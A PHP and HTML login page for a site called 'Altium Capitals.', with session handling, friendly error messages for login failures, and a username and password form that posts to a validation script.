<?php
ini_set('display_errors', 0);
session_start();

// Initialize variable
$error = '';

// Check if there's an error in the URL
if (isset($_GET['error'])) {
    $errorType = $_GET['error'];

    // Translate the error code to a friendly message
    switch ($errorType) {
        case 'session_expired':
            $error = "Your session has expired. Please log in again.";
            break;
        case 'invalid_credentials':
            $error = "Invalid username or password. Please try again.";
            break;
        case 'account_locked':
            $error = "Your account is locked. Contact support for help.";
            break;
        default:
            $error = htmlspecialchars($errorType);
            break;
    }
}
// unset($_SESSION['account_user']);
// unset($_SESSION['account_accountID']);
// unset($_SESSION['account_firstname']);
// unset($_SESSION['account_lastname']);
// session_destroy();

?>
<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->

<head>
    <meta charset="utf-8" />
    <title>Login | Altium Capitals.</title>
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" />
    <meta content="" name="description" />
    <meta content="" name="author" />
    <link rel="shortcut icon" href="./img/edited.png" type="image/png">
    <!-- ================== BEGIN BASE CSS STYLE ================== -->
    <link href="assets/plugins/jquery-ui/themes/base/minified/jquery-ui.min.css" rel="stylesheet" />
    <link href="assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
    <link href="assets/plugins/icon/themify-icons/themify-icons.css" rel="stylesheet" />
    <link rel="stylesheet"
        href="../../../../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link href="assets/css/animate.min.css" rel="stylesheet" />
    <link href="assets/css/style.min.css" rel="stylesheet" />
    <!-- ================== END BASE CSS STYLE ================== -->

    <!-- ================== BEGIN BASE JS ================== -->
    <script src="assets/plugins/loader/pace/pace.min.js"></script>
    <!-- ================== END BASE JS ================== -->
</head>

<body class="inverse-mode"
    style="background-image: url(img/walll.jpg); background-size:cover; background-attachment:fixed;">
    <!-- BEGIN #page-container -->
    <div id="page-container">
        <!-- BEGIN login -->
        <a href="#">
            <div class="login"> <img width="180px" class="logo-light" src="../assets/img/edited.png" alt="logo"
                    style="padding:10px;">
                <b style="font-size:2.0em; color:#fff;"></b>
                <!-- BEGIN login-cover -->
                <div class="login-cover"></div>
                <!-- END login-cover -->
                <!-- BEGIN login-content -->
                <div class="login-content">
                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                    <!-- BEGIN login-brand -->
                    <div class="login-brand">
                        <i class="fa fa-lock logo text-primary me-2"></i>
                        <h3 class="fw-bold ">Altium Capitals.</h3>

        </a>
    </div>
    <!-- END login-brand -->
    <!-- BEGIN login-desc -->
    <div class="login-desc">
        Log in securely into your account
    </div><br>
    <!-- END login-desc -->
    <!-- BEGIN login-form -->
    <form method="POST" action="validate-login.php">
        <?php
        if ($error) { ?>

            <div style="color: yellow; font-weight:bold; margin:15px 0px 15px 0px;"><?php echo $error; ?>
            </div>

        <?php } ?>

        <div class="form-group">
            <label class="control-label">Account ID / Username</label>
            <input type="text" name="username" class="form-control" placeholder="Enter your account no" autofocus />
            <input type="hidden" name="code" value="" class="form-control" />
        </div>
        <div class="form-group">
            <label class="control-label">Password</label>
            <input type="password" name="password" class="form-control" placeholder="Enter password" value="" />
        </div>


        <button type="submit" name="login" class="btn btn-inverse">Sign
            In</button>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;
        <a href="register"><button type="button" name="login" class="btn btn-inverse">Open
                Account</button>
            <br><br><a href="../"><strong>[ Back to Home page ]</strong></a>

    </form>
    <!-- END login-form --><br><br><br><br><br><br><br><br><br><br><br>
    <footer class="">
        &copy; <?php echo date('Y'); ?> Altium Capitals.. All Rights Reserved.

    </footer>
    </div>
    <!-- END login-content -->
    </div>
    <!-- END login -->

    <!-- BEGIN btn-scroll-top -->
    <a href="#" data-click="scroll-top" class="btn-scroll-top fade"><i class="ti-arrow-up"></i></a>
    <!-- END btn-scroll-top -->

    </div>
    <!-- END #page-container -->

    <!-- ================== BEGIN BASE JS ================== -->
    <script src="assets/plugins/jquery/jquery-1.9.1.min.js"></script>
    <script src="assets/plugins/jquery/jquery-migrate-1.1.0.min.js"></script>
    <script src="assets/plugins/jquery-ui/ui/minified/jquery-ui.min.js"></script>
    <script src="assets/plugins/cookie/js/js.cookie.js"></script>
    <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script>
    <script src="assets/plugins/scrollbar/slimscroll/jquery.slimscroll.min.js"></script>
    <!-- ================== END BASE JS ================== -->

    <!-- ================== BEGIN PAGE LEVEL JS ================== -->
    <script src="assets/js/apps.min.js"></script>
    <!-- ================== END PAGE LEVEL JS ================== -->

    <script>
        $(document).ready(function () {
            App.init();
        });
    </script>

</body>

</html>